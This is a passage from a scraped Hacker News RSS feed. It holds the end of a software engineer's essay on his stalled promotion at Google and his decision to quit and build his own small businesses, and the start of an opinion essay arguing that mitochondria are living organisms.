ones it did have made it look like things had gotten worse. My bug discoveries caused the overall bug count to increase. The pipelineâ€™s failures increased because I made it fail fast on anomalies instead of silently passing along bad data. I drastically reduced the time developers spent repairing those failures, but there were no metrics that tracked developer time.</p><p>My other work didnâ€™t look so good on paper either. On several occasions, I put my projects on hold for weeks or even months at a time to help a teammate whose launch was at risk. It was the right decision for the team, but it looked unimpressive in a promo packet. To the promotion committee, my teammateâ€™s project was the big, important work that demanded coordination from multiple developers. If they hornswoggled me into helping them, itâ€™s evidence of their strong leadership qualities. I was just the mindless peon whose work was so irrelevant that it could be pre-empted at a momentâ€™s notice.</p><p>I submitted my first promo packet, and the results were what I feared: the promotion committee said that I hadnâ€™t proven I could handle technical complexity, and they couldnâ€™t see the impact I had on Google.</p><p><a href="https://mtlynch.io/why-i-quit-google/promo-committee.png"><img sizes="(min-width: 768px) 800px, 98vw" srcset="https://mtlynch.io/why-i-quit-google/promo-committee_hu7b22fcc95e2f40d7ada24e83ce6de553_523971_300x0_resize_lanczos_3.png 300w,
https://mtlynch.io/why-i-quit-google/promo-committee_hu7b22fcc95e2f40d7ada24e83ce6de553_523971_600x0_resize_lanczos_3.png 600w,
https://mtlynch.io/why-i-quit-google/promo-committee_hu7b22fcc95e2f40d7ada24e83ce6de553_523971_800x0_resize_lanczos_3.png 800w,
https://mtlynch.io/why-i-quit-google/promo-committee.png 1024w" src="https://mtlynch.io/why-i-quit-google/promo-committee.png" alt="Arguing my case to the promotion committee" loading="lazy"></a></p><h2 id="learning-from-rejection">Learning from rejection<a href="#learning-from-rejection" arialabel="Anchor"> ğŸ”—ï¸</a></h2><p>The rejection was a difficult blow, but I wasnâ€™t discouraged. I felt I was performing above my level, but the promotion committee couldnâ€™t see it. That was solvable.</p><p>I decided that I had been too naÃ¯ve in my first couple years. I didnâ€™t do enough planning up front to make sure the work I was doing left a paper trail. Now that I understood how the process worked, I could keep doing the same good work, just with better record-keeping.</p><p>For example, my team was receiving tons of distracting email alerts due to false alarms. Old me would have just fixed these alerts. But now I knew that for this work to appear in my promo packet, I should first set up metrics so that weâ€™d have historical records of alert frequency. At promotion time, Iâ€™d have an impressive-looking graph of the alerts trending downward.</p><p>Shortly after, I was assigned a project that seemed destined for promotion. It depended heavily on machine-learning, which was and still is the hot thing at Google. It would automate a task that hundreds of human operators were doing manually, so it had a clear, objective impact on Google. It also required me to lead a junior developer throughout the project, which generally won points with promotion committees.</p><h2 id="the-holiday-gift-wake-up-call">The holiday gift wake up call<a href="#the-holiday-gift-wake-up-call" arialabel="Anchor"> ğŸ”—ï¸</a></h2><p>A few months later, Google <a href="http://fortune.com/2016/12/09/alphabet-donated-its-employees-holiday-gifts-to-charity/">made headlines</a> when they ended their long-standing tradition of giving lavish holiday gifts to all of their employees. Instead, they used the gift budget to buy <del>advertising disguised as charity</del> Chromebooks for underprivileged schoolchildren.</p><p>Shortly after this, I witnessed the following conversation between two employees:</p><blockquote><p><strong>Employee A</strong>: You effectively <strong>are</strong> still getting the gift. Cuts like these increase the value of Googleâ€™s stock. You can sell your stock grants and buy any present you choose.</p><p><strong>Employee B</strong>: What if I told my wife that I wasnâ€™t buying her a Christmas gift, but she could use the money in our bank account to buy any present she wants?</p><p><strong>Employee A</strong>: Youâ€™re in a <strong>business</strong> relationship with Google. If youâ€™re disappointed that Google isnâ€™t â€œromancingâ€ you with gifts like you do for your wife, you have a misguided notion of the relationship.</p></blockquote><p>Wait a second. <em>I</em> was in a business relationship with Google.</p><p>It may sound strange that it took me two and a half years to realize it, but Google does a good job of building a sense of community within the organization. To make us feel that weâ€™re not just employees, but that we <em>are</em> Google.</p><p>That conversation made me realize that Iâ€™m <em>not</em> Google. I provide a service to Google in exchange for money.</p><p>So if Google and I have a business relationship that exists to serve each sideâ€™s interests, why was I spending time on all these tasks that served Googleâ€™s interests instead of my own? If the promotion committee doesnâ€™t reward bugfixing or team support work, why was I doing that?</p><p>My first denied promotion taught me the wrong lesson. I thought I could keep doing the same work but package it to look good for the promotion committee. I should have done the opposite: figure out what the promotion committee wants, and do that work exclusively.</p><p>I adopted a new strategy. Before starting any task, I asked myself whether it would help my case for promotion. If the answer was no, I didnâ€™t do it.</p><p>My quality bar for code dropped from, â€œWill we be able to maintain this for the next 5 years?â€ to, â€œCan this last until Iâ€™m promoted?â€ I didnâ€™t file or fix any bugs unless they risked my projectâ€™s launch. I wriggled out of all responsibilities for maintenance work. I stopped volunteering for campus recruiting events. I went from conducting one or two interviews per week to zero.</p><h2 id="then-my-project-was-canceled">Then my project was canceled<a href="#then-my-project-was-canceled" arialabel="Anchor"> ğŸ”—ï¸</a></h2><p>Priorities shifted. Management traded my project away to our sister team in India. In exchange, that team gave us one of their projects. It was an undocumented system, built on deprecated infrastructure, but it was nevertheless a critical component in production. I was assigned to untangle it from our sister teamâ€™s code and migrate it to a new framework, all while keeping it running in production and hitting its performance metrics.</p><p>As far as my promotion was concerned, this was a setback of several months. Because I hadnâ€™t released anything for my canceled project, the two months I spent on it were worthless. It would take me weeks just to get up to speed on the system I was inheriting, and I was liable to lose several more in the gruntwork of keeping it operational.</p><h2 id="what-am-i-even-doing">What am I even doing?<a href="#what-am-i-even-doing" arialabel="Anchor"> ğŸ”—ï¸</a></h2><p>It was the third time in six months that my manager had reassigned me midway through a project. Each time, he assured me that it had nothing to do with the quality of my work, but rather some shift in upper management strategy or team headcount.</p><p>At this point, I took a step back to assess what was happening from a high level. Forget my manager, forget his managers, forget the promotion committee. What if I boiled it down to just me and just Google? What was happening in our â€œbusiness relationship?â€</p><p>Well, Google kept telling me that it couldnâ€™t judge my work until it saw me complete a project. Meanwhile, I couldnâ€™t complete any projects because Google kept interrupting them midway through and assigning me new ones.</p><p>The dynamic felt absurd.</p><p><a href="https://mtlynch.io/why-i-quit-google/book-publisher.png"><img sizes="(min-width: 768px) 750px, 98vw" srcset="https://mtlynch.io/why-i-quit-google/book-publisher_hu67c1fce3e1f8685743944e5c14f41bdf_378594_300x0_resize_lanczos_3.png 300w,
https://mtlynch.io/why-i-quit-google/book-publisher_hu67c1fce3e1f8685743944e5c14f41bdf_378594_600x0_resize_lanczos_3.png 600w,
https://mtlynch.io/why-i-quit-google/book-publisher_hu67c1fce3e1f8685743944e5c14f41bdf_378594_800x0_resize_lanczos_3.png 800w,
https://mtlynch.io/why-i-quit-google/book-publisher.png 1024w" src="https://mtlynch.io/why-i-quit-google/book-publisher.png" alt="The Google promotion committee approach to book publishing" loading="lazy"></a></p><p>My career was being dictated by a shifting, anonymous committee who thought about me for an hour of their lives. Management decisions that I had no input into were erasing months of my career progress.</p><p>Worst of all, I wasnâ€™t proud of my work. Instead of asking myself, â€œHow can I solve this challenging problem?â€ I was asking, â€œHow can I make this problem <em>look</em> challenging for promotion?â€ I hated that.</p><p>Even if I got the promotion, what then? Popular wisdom said that each promotion was exponentially harder than the last. To continue advancing my career, Iâ€™d need projects that were even larger in scope and involved collaboration with more partner teams. But that just meant the project could fail due to even more factors outside my control, wasting months or years of my life.</p><h2 id="whats-the-alternative">Whatâ€™s the alternative?<a href="#whats-the-alternative" arialabel="Anchor"> ğŸ”—ï¸</a></h2><p>Around this time, I discovered Indie Hackers.</p><p><a href="https://mtlynch.io/why-i-quit-google/indie-hackers.png"><img sizes="(min-width: 768px) 550px, 98vw" srcset="https://mtlynch.io/why-i-quit-google/indie-hackers_hu41c2d18a1506b17864c6f0bbd92fea7f_91019_300x0_resize_lanczos_3.png 300w,
https://mtlynch.io/why-i-quit-google/indie-hackers_hu41c2d18a1506b17864c6f0bbd92fea7f_91019_600x0_resize_lanczos_3.png 600w,
https://mtlynch.io/why-i-quit-google/indie-hackers_hu41c2d18a1506b17864c6f0bbd92fea7f_91019_800x0_resize_lanczos_3.png 800w,
https://mtlynch.io/why-i-quit-google/indie-hackers_hu41c2d18a1506b17864c6f0bbd92fea7f_91019_1200x0_resize_lanczos_3.png 1200w,
https://mtlynch.io/why-i-quit-google/indie-hackers.png 1545w" src="https://mtlynch.io/why-i-quit-google/indie-hackers.png" alt="Screenshot of Indie Hackers website" loading="lazy"></a></p><p>Itâ€™s an online community for founders of small software businesses. Emphasis on small. These werenâ€™t Zuckerberg hopefuls, but rather people who wanted to build modest, profitable businesses that pay their bills.</p><p>I had always been interested in starting my own software company, but I only knew of the Silicon Valley startup path. I thought being a software founder meant spending most of my time fundraising and the rest of it worrying about how to attract my next million users.</p><p>Indie Hackers presented an attractive alternative. Most members built their businesses with their own savings or as side projects to their full-time jobs. They didnâ€™t answer to investors, and they certainly didnâ€™t have to prove themselves to anonymous committees.</p><p>There were downsides, of course. Their income was less steady, and they faced more numerous catastrophic risks. If I ever made a mistake at Google that cost the company $10 million, I would suffer no consequences. Iâ€™d be asked to write a post-mortem, and everyone would celebrate the learning opportunity. For most of these founders, a $10 million mistake would mean the end of their business and several lifetimes of debt.</p><p>Founders on Indie Hackers captivated me because they were in control. Whether their business became a runaway success or stagnated for years, they were calling the shots. At Google, I didnâ€™t feel in control of my own projects, much less my career growth or my teamâ€™s direction.</p><p>I thought about it for months and finally decided. I wanted to be an Indie Hacker.</p><h2 id="one-last-thing-before-i-leave">One last thing before I leave<a href="#one-last-thing-before-i-leave" arialabel="Anchor"> ğŸ”—ï¸</a></h2><p>I still had unfinished business at Google. After investing three years into my promotion, I hated the idea of leaving with nothing to show for it. There were only a few months left until I could reapply for promotion, so I decided to give it one last shot.</p><p>Six weeks before the performance period ended, my project was canceled. Again.</p><p>Actually, my whole team was canceled. This was a common enough occurrence at Google that there was a euphemism for it: a defrag. Management transferred my teamâ€™s projects to our sister team in India. My teammates and I all had to start over in different areas of the company.</p><p>I applied for the promotion anyway. Weeks later, my manager read me the results. My performance rating was â€œSuperb,â€ the highest possible score, given to around 5% of employees each cycle. The promotion committee noted that in the past six months, I clearly demonstrated senior-level work. These were, uncoincidentally, the months when I was optimizing for promotion.</p><p><em>But</em> they felt that six months wasnâ€™t a long enough track record, soâ€¦ better luck next time.</p><p>My manager told me I had a strong chance at promotion if I did the same quality work for another six months. I canâ€™t say I wasnâ€™t tempted, but by that point, Iâ€™d been hearing, â€œgreat shot at promotion in six months,â€ for the past two years.</p><p>It was time to go.</p><h2 id="whats-next">Whatâ€™s next?<a href="#whats-next" arialabel="Anchor"> ğŸ”—ï¸</a></h2><p>When I tell people I left Google, they assume I must have some brilliant startup idea. Only an <em>idiot</em> would leave a job as cushy as Google Software Engineer.</p><p>But I am indeed an idiot with no idea.</p><p>My plan is to try different projects for a few months each to see if any of them catch on, for example:</p><ul><li>Continue working on <a href="https://mtlynch.io/tags/ketohub">KetoHub</a> to see if I can make it profitable</li><li>Build a business on top of Sia, a distributed storage technology Iâ€™ve <a href="https://mtlynch.io/tags/sia">written about frequently</a></li><li>Spend more time writing, and look for ways to earn money from it</li></ul><p>Google was a great place to work, and I learned valuable skills during my time there. Leaving was difficult because I had more to learn, but there will always be employers like Google. I wonâ€™t always have the freedom to start my own company, so I look forward to seeing where this takes me.</p><h2 id="updates">Updates<a href="#updates" arialabel="Anchor"> ğŸ”—ï¸</a></h2><ul><li><strong>Update (Feb. 1, 2019)</strong>: <a href="https://mtlynch.io/solo-developer-year-1/">My First Year as a Solo Developer</a></li><li><strong>Update (Jan. 31, 2020)</strong>: <a href="https://mtlynch.io/solo-developer-year-2/">My Second Year as a Solo Developer</a></li><li><strong>Update (Feb. 1, 2021)</strong>: <a href="https://mtlynch.io/solo-developer-year-3/">My Third Year as a Solo Developer</a></li><li><strong>Update (Feb. 1, 2022)</strong>: <a href="https://mtlynch.io/solo-developer-year-4/">My Fourth Year as a Bootstrapped Founder</a></li><li><strong>Update (Feb. 10, 2023)</strong>: <a href="https://mtlynch.io/solo-developer-year-5/">My Fifth Year as a Bootstrapped Founder</a></li><li><strong>Update (Feb. 10, 2024)</strong>: <a href="https://mtlynch.io/solo-developer-year-6/">My Sixth Year as a Bootstrapped Founder</a></li></ul><hr><p><em>Illustrations by <a href="https://www.loraineyow.com/">Loraine Yow</a>.</em></p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Mitochondria Are Alive (451 pts)]]></title>
            <link>https://www.asimov.press/p/mitochondria</link>
            <guid>42088758</guid>
            <pubDate>Fri, 08 Nov 2024 17:39:43 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.asimov.press/p/mitochondria">https://www.asimov.press/p/mitochondria</a>, See on <a href="https://news.ycombinator.com/item?id=42088758">Hacker News</a></p>
<div id="readability-page-1" class="page"><div dir="auto"><p><strong><span>An opinion essay by </span><a href="https://www.hertzfoundation.org/person/liyam-chitayat/" rel="">Liyam Chitayat</a></strong></p><p>The cells within our body are the remnants of an ancient alliance.&nbsp;</p><p><span>In a 1967 paper called â€œ</span><a href="https://doi.org/10.1016/0022-5193(67)90079-3" rel="">On the Origin of Mitosing Cells</a><span>,â€ American evolutionary biologist Lynn Margulis proposed an idea that, upon first hearing, seems ludicrous. Her paper, in fact, was rejected by 12 different journals before it was published.</span></p><p>Margulis argued that one-and-a-half billion years ago, a primitive eukaryotic cell engulfed an oxygen-utilizing bacterium. But rather than digesting this bacterium â€” or conversely, the bacterium destroying its newfound host â€” the two cells gradually entered into an endosymbiotic relationship; the host provided nutrients and protection to the bacterium, and the bacterium supplied energy to the host. Margulis argued that this endosymbiosis event was a seminal â€œinnovation engineâ€ for biological systems, ultimately leading to the modern mitochondrion and chloroplast.</p><p>Margulisâ€™ theory was attacked and ridiculed, igniting academic hostilities that lasted for decades. Over time, though, biologists began to accept her ideas because the membrane structure and molecular machinery within mitochondria closely resemble that of extant bacteria. Most biologists today, however, also believe that mitochondria have â€œdevolvedâ€ into little more than membrane-bound organelles, similar to inanimate components like the endoplasmic reticulum or Golgi apparatus.</p><p><span>But a swelling tide of scientific evidence about mitochondrial functions and dynamics suggests otherwise â€” </span><em>mitochondria are not just organelles, but their own life forms.</em><strong>&nbsp;&nbsp;&nbsp;</strong></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F58d79ce7-9f19-4a32-8ad2-13c18f831ad8_1200x800.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F58d79ce7-9f19-4a32-8ad2-13c18f831ad8_1200x800.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F58d79ce7-9f19-4a32-8ad2-13c18f831ad8_1200x800.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F58d79ce7-9f19-4a32-8ad2-13c18f831ad8_1200x800.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F58d79ce7-9f19-4a32-8ad2-13c18f831ad8_1200x800.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F58d79ce7-9f19-4a32-8ad2-13c18f831ad8_1200x800.png" width="1200" height="800" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/58d79ce7-9f19-4a32-8ad2-13c18f831ad8_1200x800.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:800,&quot;width&quot;:1200,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:309045,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:false,&quot;topImage&quot;:true,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F58d79ce7-9f19-4a32-8ad2-13c18f831ad8_1200x800.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F58d79ce7-9f19-4a32-8ad2-13c18f831ad8_1200x800.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F58d79ce7-9f19-4a32-8ad2-13c18f831ad8_1200x800.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F58d79ce7-9f19-4a32-8ad2-13c18f831ad8_1200x800.png 1456w" sizes="100vw" fetchpriority="high"></picture></div></a><figcaption>An image from L. Margulisâ€™ 1967 paper, depicting the origins of modern mitochondria.</figcaption></figure></div><p>This distinction between â€œlifeâ€ on the one hand and â€œmere membranous structureâ€ on the other may seem trivial, but itâ€™s a symptom of a deeper problem. Defining mitochondria as â€œnonlivingâ€ isnâ€™t just a classification mistake, nor a question of word choice. Rather, it is a fundamental misunderstanding of the nature and role of mitochondria. It inherently undermines our understanding of biological systems and deeply influences the tools we build to study them. </p><p>If we think of mitochondria as non-living organelles, how will we ever harness their full potential?</p><p>The precise definition of â€œlifeâ€ has been debated since the inception of biology as a scientific field. Even today, researchers offer overlapping, but distinct, criteria. Molecular biologists tend to focus on characteristics like metabolism, growth and development, response to stimuli, reproduction, and the ability to process information or evolve. This definition uses â€œchecklistsâ€ to determine whether or not an organism is alive.</p><p>Biophysicists often take a more rigorous approach, defining life by means of energetic terms. Physicists Erwin SchrÃ¶dinger and Ilya Prigogine said that living organisms maintain order despite the universe's tendency towards increasing entropy, a measure of how dispersed or disordered the energy within a system is. Living systems maintain far-from-equilibrium states, constantly exchanging matter and energy with their environment to sustain highly organized structures. Cells take in low-entropy inputs, such as food or sunlight, and expel high-entropy outputs, including waste.</p><p>Regardless of which definition one chooses, mitochondria are clearly alive.</p><p>Mitochondria carry their own genomes and express their own genes within their lumens, an internal pocket of watery space, using biomolecules distinct from the cellâ€™s nucleus. Mitochondria also replicate and divide through binary fission, much like bacteria. If one considers bacteria as living entities â€” and all biologists seem to â€” then it is impossible to explain why mitochondria are not.</p><p>From a thermodynamic perspective, mitochondria take in low-entropy inputs from their host cell, such as glucose or fatty acids, and expel high-entropy outputs, including carbon dioxide and water. Mitochondria also pump out protons through their inner membrane to maintain an out-of-equilibrium thermodynamic balance, using the resulting gradient to produce the ATP molecules that fuel cellular functions, from DNA replication to protein synthesis.</p><p><span>From the molecular biologistâ€™s perspective, a mitochondrionâ€™s role is not limited to simple energy generation, either. Mitochondria also process</span><em> </em><span>information and interact with their environment, much like a human cell. They monitor steroid hormones, oxidative stress, heat, ATP levels, secondary metabolites, and </span><a href="https://journals.physiology.org/doi/full/10.1152/physrev.00058.2021#" rel="">many more molecules</a><span> floating through their environment, the cellâ€™s cytoplasm. Mitochondria then use this information to precisely control cellular functions. For example, when a virus invades a cell, the mitochondria are critical in sensing the intrusion and signaling a host cell to undergo programmed cell death to halt its spread.</span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fabab6c4f-4f66-44a9-8234-cc8eaddc975e_1200x800.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fabab6c4f-4f66-44a9-8234-cc8eaddc975e_1200x800.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fabab6c4f-4f66-44a9-8234-cc8eaddc975e_1200x800.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fabab6c4f-4f66-44a9-8234-cc8eaddc975e_1200x800.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fabab6c4f-4f66-44a9-8234-cc8eaddc975e_1200x800.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fabab6c4f-4f66-44a9-8234-cc8eaddc975e_1200x800.png" width="1200" height="800" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/abab6c4f-4f66-44a9-8234-cc8eaddc975e_1200x800.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:800,&quot;width&quot;:1200,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:327767,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fabab6c4f-4f66-44a9-8234-cc8eaddc975e_1200x800.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fabab6c4f-4f66-44a9-8234-cc8eaddc975e_1200x800.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fabab6c4f-4f66-44a9-8234-cc8eaddc975e_1200x800.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fabab6c4f-4f66-44a9-8234-cc8eaddc975e_1200x800.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption>Mitochondria are intimately involved in many cellular processes; not just energy production. Image by the author.</figcaption></figure></div><p>And finally, mitochondria grow and reproduce in a manner distinct from the hostâ€™s replication process. Mitochondria independently copy their circular genomes, known as mitochondrial DNA, and divide through binary fission. Notably, mitochondrial replication has several distinct properties from those observed during human cellular replication. Mitochondrial DNA mutates 100-1,000 times faster than the human genome and these mutations can significantly alter a mitochondrionâ€™s fitness, thereby changing the fitness of its host cell. Mitochondria are thus agents of â€” and subject to â€” the forces of evolution.</p><p><span>Despite all this evidence, the main case made against mitochondria being alive is that they do not perform all of these functions </span><em>independently</em><span>, as they must be embedded within the cytoplasm of a host cell to function. However, such an argument is logically inconsistent because, by this same logic, most organisms on Earth would not be considered â€œliving.â€ After all, nothing in biology lives in isolation from its environment.&nbsp;</span></p><p><span>Human life begins inside of another human, with a zygote requiring many months in the uterus to develop into an infant. Many other organisms â€” not just mitochondria â€” also live inside other cells. For example, the bacteria </span><em><a href="https://www.ncbi.nlm.nih.gov/books/NBK7624/" rel="">rickettsiae</a><span> </span></em><span>occupy the cytoplasm of cells of ticks, lice, fleas, and mites. Other bacteria, such as </span><em><a href="https://pmc.ncbi.nlm.nih.gov/articles/PMC5911502/" rel="">Holospora spp.</a></em><span>, also live within the nucleus of various protists. All living creatures have evolved and live embedded within an environment or biological system, with different organisms embedded in different layers.</span></p><p>It seems like scientists have decided what is living based on whether or not an organism exists in certain, arbitrarily chosen layers of our biosphere. But this is a logical fallacy. Every living organism grows and adapts to occupy a specific context in the universe. We refer to this as the â€œeffective nicheâ€ of the lifeform, which could be both inside and outside of another living system. Just because an organism has evolved to live in one niche does not mean that the organism cannot survive in another. Therefore, the so-called â€œpotential nicheâ€ of a lifeform is often much larger than its effective niche.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffa6de7af-2472-42ef-8e1d-cfad5738af17_1200x800.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffa6de7af-2472-42ef-8e1d-cfad5738af17_1200x800.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffa6de7af-2472-42ef-8e1d-cfad5738af17_1200x800.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffa6de7af-2472-42ef-8e1d-cfad5738af17_1200x800.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffa6de7af-2472-42ef-8e1d-cfad5738af17_1200x800.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffa6de7af-2472-42ef-8e1d-cfad5738af17_1200x800.png" width="1200" height="800" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/fa6de7af-2472-42ef-8e1d-cfad5738af17_1200x800.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:800,&quot;width&quot;:1200,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:404460,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffa6de7af-2472-42ef-8e1d-cfad5738af17_1200x800.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffa6de7af-2472-42ef-8e1d-cfad5738af17_1200x800.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffa6de7af-2472-42ef-8e1d-cfad5738af17_1200x800.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffa6de7af-2472-42ef-8e1d-cfad5738af17_1200x800.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption>The â€œpotentialâ€ niche of an organism is typically much larger than its â€œeffectiveâ€ niche. Image by the author.</figcaption></figure></div><p><span>Consider, for example, that free-living bacteria have been artificially implanted into the cytoplasms of different fungi. Researchers at ETH Zurich </span><a href="https://www.nature.com/articles/s41586-024-08010-x" rel="">recently implanted</a><span> â€œbacteria into the filamentous fungus </span><em>Rhizopus microsporus</em><span> to follow the fate of artificially induced endosymbioses.â€ It is clear that the insertion of bacteria into other cells does not suddenly make those bacteria non-living.</span></p><p><span>Similarly, a mitochondrionâ€™s effective niche is a host cellâ€™s cytoplasm, but its potential niche is likely far greater. Mitochondria are not bound to their host cell; they can </span><a href="https://onlinelibrary.wiley.com/doi/full/10.1111/tra.12951" rel="">travel between different cells</a><span>. Although different species carry distinct mitochondria, experiments show that mitochondria from one species can be transferred to another.&nbsp;</span></p><p><span>In 1997, scientists isolated mitochondria from chimpanzees and gorillas and showed that they are naturally internalized and integrated </span><a href="https://pmc.ncbi.nlm.nih.gov/articles/PMC23071/" rel="">into human cells</a><span>. Notably, the addition of external mitochondria even showed therapeutic benefits in </span><a href="https://www.frontiersin.org/journals/neuroscience/articles/10.3389/fnins.2022.800883/full" rel="">heart failure and spinal cord injury</a><span>. Thus, the potential niche that mitochondria can live in is greater than their effective niche.&nbsp;</span></p><p>When Margulis fought to overturn widely-held ideas in evolutionary biology, it allowed biologists to understand how 